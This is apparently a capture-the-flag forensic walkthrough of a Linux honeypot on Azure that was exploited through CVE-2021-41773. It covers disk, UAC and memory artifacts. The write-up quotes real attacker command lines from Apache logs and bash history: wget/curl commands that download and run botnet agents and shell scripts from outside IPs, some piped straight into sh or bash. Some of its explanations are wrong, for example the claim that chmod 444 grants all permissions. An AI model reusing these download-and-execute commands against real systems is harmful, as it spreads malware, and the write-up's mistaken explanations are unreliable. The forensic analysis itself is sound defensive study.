# Scenario
This Ubuntu Linux honeypot was deployed in Azure in early October to monitor activities related to the exploitation of CVE-2021-41773.
Initially, the system attracted a significant number of cryptocurrency miners. To mitigate this, a cron script was implemented to remove files named "kinsing" in the /tmp directory. This action was taken to prevent these miners from interfering so that more interesting activities could be observed.
There are three key files available:
- sdb.vhd.gz: This file is a Virtual Hard Disk (VHD) of the main drive, obtained through an Azure disk snapshot.
- ubuntu.20211208.mem.gz: This file is a memory dump created using Lime.
- uac.tgz: This file contains the results of User Account Control (UAC) running on the system.
The artifacts were collected in the following order: the drive was snapshotted first, followed by the memory dump, and finally, the UAC results were gathered. 

# File: Sbd.bhd.gz
We mount the image file in the FTK Imager, it is forensic imaging tool used in Windows for acquiring, analyzing, and mounting forensic images. We launch FTK and add our image. 
## Q1. There is a script that runs every minute to do cleanup. What is the name of the file?
This is scheduled scripts, meaning the script file are stored in specific directories, typically under /var/spool/cron/crontabs.  
<img width="853" height="589" alt="image" src="https://github.com/user-attachments/assets/d154b25a-f043-4139-b207-f58e20f8dc26" />
Open the root file, there is particular line of code /root/.remove.sh
<img width="633" height="124" alt="image" src="https://github.com/user-attachments/assets/91ab6ef5-0293-43d3-b1ca-ecad0e09e00f" />

## Q2. The script in Q1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file?
Open remove.sh script to inspect its functions.  
<img width="819" height="236" alt="image" src="https://github.com/user-attachments/assets/1cb7a1b4-df74-478e-a109-6b78cdbf0d65" />
The answer is: Kinsing

## Q3. The script changes the permissions for some files. What is their new permission?
In the script we identified earlier, after terminating processes related to malware, two commands are executed to modify the ownership and permissions of files within /tmp. The relevant portion of the script is:
chown root:root /tmp/k*
chmod 444 /tmp/k*
<img width="430" height="263" alt="image" src="https://github.com/user-attachments/assets/9b97810d-2eae-4721-89d1-e125a2735e52" />
444 - gives all permissions to /tmp directory that usually used by hackers in attacks. 

## Q4. What is the SHA256 of the botnet agent file?
go to /tmp directory to look for file, extract it and get the hash.
<img width="486" height="429" alt="image" src="https://github.com/user-attachments/assets/cd8133a7-b13a-403e-824b-77b4a0556a4d" />
0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 is hash. 

## Q5. What is the name of the botnet in Q4?
<img width="998" height="255" alt="image" src="https://github.com/user-attachments/assets/5ffd1ba9-f9cd-4546-b4d2-1281a0c70be7" />
Tsunami 

## Q6. What IP address matches the creation timestamp of the botnet agent file in Q4?
If we look at the created time of the file in Q4 timestamp should be around 11/11/2021 19:09:51 (UTC),  and since there are some comments that relate this sample to activity running Apache Log4j RCE attempts, let's check the logs from Apache, which seems to had been running on the system.
<img width="946" height="464" alt="image" src="https://github.com/user-attachments/assets/879475f4-6241-4fd0-ad50-3bf4172715b4" />

## Q7. What URL did the attacker use to download the botnet agent?
Attackers often use tools like wget or curl to download malicious files. These commands should be logged. Lets search the Apache error_log for any wget or curl commands executed close to the creation timestamp of the botnet agent.
<img width="938" height="125" alt="image" src="https://github.com/user-attachments/assets/2ef3a003-a449-4982-b45c-061023f65e17" />
wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86;
The wget command downloads a file from http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86, saving it locally as dk86. The URL indicates the file was hosted on an HTTP server at that IP, likely within a compromised WordPress Twenty Sixteen theme to hide the malware. The attacker then made it executable (chmod +x dk86) and ran it (./dk86), confirming the botnet agent was actively executed on the system.

## Q8. What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?
To identify the file the attacker downloaded and executed, we analyzed the Apache error logs for suspicious URLs. We filtered out benign requests to trusted domains like Google and Microsoft, leaving a set of unfamiliar URLs indicative of potential malicious activity. One notable URL was:
<img width="1316" height="69" alt="image" src="https://github.com/user-attachments/assets/cffaafe3-8ca2-41cd-8685-326b254e1c95" />
the decoded base64 string: curl -s http://116.203.212.184/1010/b64.php -u client:%@123-456%@ --data-urlencode "s=<Base64_String>" | sh
http://116.203.212.184/1010/b64.php

## Q9. The attacker downloaded SH scripts. What are the names of these files?
If we grep error_log looking for .sh files we can easily spot three of them that match the suggested solution (remember to include a whitespace after the commas when entering the answer)
Command: grep echo error_log |grep .sh
And here we can see all three different names
[Sun Nov 07 07:14:37.098728 2021] [dumpio:trace7] [pid 4449:tid 139978805794560] mod_dumpio.c(103): [client 62.76.41.46:51230] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
[Sun Nov 07 10:39:12.876655 2021] [dumpio:trace7] [pid 4449:tid 139978805794560] mod_dumpio.c(103): [client 40.117.148.240:49202] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;curl -s http://103.55.36.245/0_cron.sh -o 0_cron.sh || wget -q -O 0_cron.sh http://103.55.36.245/0_cron.sh; chmod 777 0_cron.sh; sh 0_cron.sh
[Sun Nov 07 10:52:33.141762 2021] [dumpio:trace7] [pid 4449:tid 139978856150784] mod_dumpio.c(103): [client 40.117.148.240:51776] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;curl -s http://103.55.36.245/0_linux.sh -o 0_linux.sh || wget -q -O 0_linux.sh http://103.55.36.245/0_linux.sh; chmod 777 0_linux.sh; sh 0_linux.sh


# File: UAC
## Q1. Two suspicious processes were running from a deleted directory. What are their PIDs?
Use grep to grep deleted files. <img width="950" height="259" alt="image" src="https://github.com/user-attachments/assets/12b174d8-744e-42c1-8814-cc800f431cc8" />
This search reveals processes still running from deleted executables. Two notable examples:
Process 1
PID: 6388
Path: /tmp/.log/101068 (deleted)
Details: Running sleep from /tmp, a temporary directory often abused by attackers.

Process 2
PID: 20645
Path: /tmp/.log/101068 (deleted)
Details: Running sh from the same /tmp location, indicating suspicious activity.

## Q2. UAC What is the suspicious command line associated with the 2nd PID in Q#10?
Grep pid of second process 
<img width="1009" height="273" alt="image" src="https://github.com/user-attachments/assets/041ef74a-5140-4df4-8bf0-3a6f492ebb22" />
Which is "sh .src.sh"

## Q3. What is the suspicious command line associated with the PID that ends with `45` in Q10?
Check the environment variables for the process PID 20645 to find any network-related information. In this case, lets check environ.txt, which stores a processes environment variables, often contains network information such as remote IPs and ports.
<img width="434" height="190" alt="image" src="https://github.com/user-attachments/assets/f142eda8-cbf8-42b7-9543-90d24f87e7b8" />
Answer: 116.202.187.77:56590

## Q4. Which user was responsible for executing the command in Q11?
User: Daemon
<img width="231" height="123" alt="image" src="https://github.com/user-attachments/assets/5c18ef66-4f1e-4bf5-9033-c38bddce8d2a" />

## Q5. Two suspicious shell processes were running from the tmp folder. What are their PIDs?
Lets check /tmp folder by grep. Look for any suspicious activity.
<img width="1187" height="135" alt="image" src="https://github.com/user-attachments/assets/bae13e25-d350-4e8f-8eb3-4c05922834a3" />

# 3. File: ubuntu.20211208.mem
## Q1. What is the MAC address of the captured memory?
After reviewing other write-ups, it’s clear the intended method was to create a memory profile and analyze the dump with Volatility. 
However, another approach works: generate a strings output from the memory file, grep for MAC addresses, and, after sorting and extracting unique values, we get:
 strings -a ubuntu.20211208.mem >> ubuntu.20211208.mem.txt
 egrep -o '([a-f0–9]{2}:){5}[a-f0–9]{2}' ubuntu.20211208.mem.txt | sort | uniq -c
 19 00:00:00:00:00:00
 2 00:1b:0d:e6:57:c0
 4 00:1b:0d:e6:58:40
 353 00:22:48:26:3b:16
 6 ff:ff:ff:ff:ff:ff
 The final MAC address belongs to Microsoft, consistent with this environment running on Azure.
Answer: 00:22:48:26:3b:16

## Q2. Based on Bash history. The attacker downloaded the SH script. What is the name of the file?
The linux_bash plugin shows the bash history. Grepping for .sh downloads:
# python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_bash | grep -E '(wget |curl ).*\.sh'
4205 bash 2021-12-08 16:12:31 UTC+0000 wget http://88.218.227.141/wget.sh
4205 bash 2021-12-08 16:12:31 UTC+0000 wget http://185.191.32.198/unk.sh
Both IPs are flagged as malicious on VirusTotal. Of the files, only unk.sh matches the pattern, suggesting the attacker downloaded at least one malicious script via bash.

